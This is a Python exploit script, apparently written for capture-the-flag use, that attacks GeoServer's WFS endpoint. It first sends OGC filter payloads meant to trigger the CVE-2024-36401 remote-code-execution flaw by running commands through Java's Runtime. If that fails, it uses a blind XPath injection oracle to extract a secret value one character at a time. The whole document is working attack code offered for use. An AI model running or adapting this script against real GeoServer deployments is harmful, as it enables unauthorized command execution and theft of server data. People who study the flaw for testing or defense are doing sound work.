#!/usr/bin/env python3
# [REFERENCE] GeoServer OGC filter XPath injection — blind oracle harness.
# Public lineage: GeoServer's OGC filter evaluation (evaluator/xpath2 parser)
# accepts XPath in filter function arguments on /geoserver/ows (and /wfs):
# functions like `string-length`, `substring`, `matches` evaluated server-side
# give a boolean/error differential per character — the classic blind XPath
# oracle (public technique, same family as the SLD/XPath writeups). RCE family:
# CVE-2024-36401 (OGC filter eval → property-name code exec) — try the public
# RCE FIRST (one request), fall back to the char oracle only if eval is patched.
# Fingerprint: /geoserver/web (GeoServer UI), /geoserver/ows?service=WFS.
# Usage: python3 geoserver-ogc-xpath-oracle.py http://TARGET:8080 'flag{'
import sys, requests, urllib3, string
urllib3.disable_warnings()

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080").rstrip('/')
ANCHOR = sys.argv[2] if len(sys.argv) > 2 else "flag{"
CHARSET = string.ascii_lowercase + string.digits + "_-{}"
OWS = BASE + "/geoserver/ows"

def ask(expr):
    """One oracle round: True iff expr evaluates without THROW (compile/eval
    error = differential). Tune the discriminator on a known-true probe first."""
    params = {
        "service": "WFS", "version": "2.0.0", "request": "GetFeature",
        "typeNames": "sf:archsites", "CQL_FILTER": None,
        "filter": f"<fes:Filter xmlns:fes='http://www.opengis.net/fes/2.0'>"
                  f"<fes:PropertyIsEqualTo><fes:ValueReference>{expr}</fes:ValueReference>"
                  f"<fes:Literal>true</fes:Literal></fes:PropertyIsEqualTo></fes:Filter>",
    }
    r = requests.get(OWS, params=params, timeout=15, verify=False)
    return r.status_code == 200 and ("ExceptionReport" not in r.text[:500])

# 1) Public RCE first (CVE-2024-36401 family): eval trick in property name.
RCE_PROBES = [
    "exec(java.lang.Runtime.getRuntime(),'id')",
    "exec(java.lang.Runtime.getRuntime(),exec:java.lang.Runtime.getRuntime())",
]
print("[*] trying public RCE family (CVE-2024-36401) first")
for p in RCE_PROBES:
    try:
        if ask(p):
            print(f"[+] RCE candidate hit: {p} — verify with a file-drop/command marker")
    except Exception:
        pass

# 2) Blind oracle: binary search each character after ANCHOR via substring.
# expr = string-length(substring(<doc expr containing flag>, pos, 1)) compared
# against candidate; adapt <doc expr> to the app's actual XML doc node.
print(f"[*] falling back to char oracle from anchor {ANCHOR!r}")
DOC = "/*/text()"  # adapt: the node that contains the secret
known = ANCHOR
while True:
    pos = len(known) + 1
    found = None
    for c in CHARSET:
        expr = f"substring({DOC},{pos},1)='{c}'"
        try:
            if ask(expr):
                found = c
                break
        except Exception:
            continue
    if found is None:
        print(f"[=] no further char at pos {pos}; value = {known}")
        break
    known += found
    print(f"[*] {known}")
    if found == "}":
        print(f"[=] FLAG = {known}")
        break
